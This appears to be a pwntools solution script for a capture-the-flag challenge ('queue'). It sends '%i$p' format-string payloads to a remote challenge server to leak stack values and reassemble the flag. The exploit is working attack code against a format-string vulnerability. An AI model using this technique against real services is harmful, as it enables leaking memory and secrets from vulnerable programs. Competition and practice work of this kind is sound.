#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
#
exe = './queue'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'


# =========================================================
#                         EXPLOITS
# =========================================================

flag = 'flag: '

for i in range(14, 20): # Range is obtained by fuzzing locally 
    try:
        # Connect to server
        io = remote('challs.actf.co', 31322)
        # Format the payload to location on stack
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char etc)
        io.sendlineafter(b'today? ', '%{}$p'.format(i).encode())
        # receive unneccesary lines 
        io.recvuntil(b'Oh nice, ')
        # receive leaked 
        result = io.recv()
        # ignore nulls
        if not b'(nil)' in result:
            # print value if exist
            print('stack at-{}'.format(i) + ": " + str(result))
            try:
                # unhex and decode leaked
                hexform = unhex(result.split()[0][2:].decode())
                # append to flag and reverse endianess
                flag += hexform.decode()[::-1]
                # confirmation
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(flag)